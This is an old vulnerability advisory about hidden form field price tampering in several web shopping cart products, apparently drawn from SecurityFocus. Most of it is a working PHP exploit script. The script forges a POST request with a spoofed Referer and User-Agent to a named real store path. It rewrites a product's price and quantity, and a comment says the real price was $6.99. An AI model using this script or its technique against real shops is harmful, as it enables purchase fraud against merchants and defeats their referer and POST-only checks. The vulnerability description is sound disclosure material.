E-Commerce Exchange QuickCommerce 2.5/3.0,McMurtrey/Whitaker & Associates Cart32 2.5 a/3.0,Shop Express 1.0,StoreCreator 3.0 Web Shopping Cart Hidden Form Field Vulnerability

source: http://www.securityfocus.com/bid/1237/info*

Various shopping cart applications use hidden form fields within the html source code with preset parameters which contain product information. For example: price, weight, quantity, identification etc. If a remote user saves the web page of a particular item to their machine it is possible for them to edit the html source, consequently allowing them to alter the parameters of the product. The modified web page can then be submitted to the shopping cart application. It is also possible in some circumstances to exploit this vulnerability via any regular browser's address bar.

Some vendors have built in checks that require the post method or the check refer field, both these requirements can be defeated via custom built http requests.

<?php
/*

   Caution - long lines ahead.

   Cart32.phtml
   Bypass lame "security" options by providing our own referer
   and tainted data via POST.
   cdi@thewebmasters.net

  PostToHost()
    Heavily modified version of Rasmus' PostToHost function
    It's generic enough to handle any method containing
    just about any data.

    $data: urlencoded QUERY_STRING format
    $cookie: urlencoded cookie string format (name=value;name=value).
*/

function PostToHost($host="",$port="80",$method="POST",$path="",$data="",$refer="",$client="",$cookie="")
{
    $fp = fsockopen($host,$port);
    if(!$fp) { echo "Failed to open port"; exit; }
    fputs($fp, "$method $path HTTP/1.0\n");
    if($cookie != "") { fputs($fp, "Cookie: $cookie\n"); }
    if($refer  != "") { fputs($fp, "Referer: $refer\n"); }
    if($client != "") { fputs($fp, "User-Agent: $client\n"); }
    if($method == "POST")
    {
        fputs($fp, "Content-type: application/x-www-form-urlencoded\n");
        fputs($fp, "Content-length: " . strlen($data) . "\n");
    }
    fputs($fp, "Connection: close\n\n");
    if($method == "POST")
    {
        fputs($fp, "$data\n");
    }
    $results = "";
    while(!feof($fp))
    {
        $results .= fgets($fp, 1024);
    }
    fclose($fp);
    return $results;
}

// Whee, now all we need to do is set up the data
$host = 'www.cart32.com';
$port = 80;
$method = "POST";
$path = '/cgi-bin/cart32.exe/justsocks-AddItem';
$refer = 'www.IGuessYouDontTakeYourOwnAdvice..com';
// And even if they did, we could set the Referer to match
// anything we wanted.

$client = 'CDI Spoof (v1.0)';
$cookie = "";

// Real price of this product was $6.99
$data = 'Price=1000.56&Item=Wigwam+Triathlete+Ultra-Lite&PartNo=F6092&Qty=5&p1=XL&t1=d-Size%3BS%3BM%3BL%3BXL&p2=Black&t2=d-Color%3BBlack%3BWhite';

// And now call the function

$raw = PostToHost($host,$port,$method,$path,$data,$refer,$client,$cookie);

print "<PRE>\n\n";
print " Host: $host\n Port: [$port]\n Method: [$method]\n Path: [$path]\n";
print " Referer: [$refer]\n Client: [$client]\n Cookie: [$cookie]\n";
print " Data: [$data]\n";
print "</PRE>\n";
print "<P>Results of operation:<BR><HR NOSHADE><P>\n";
print "$raw\n";
?>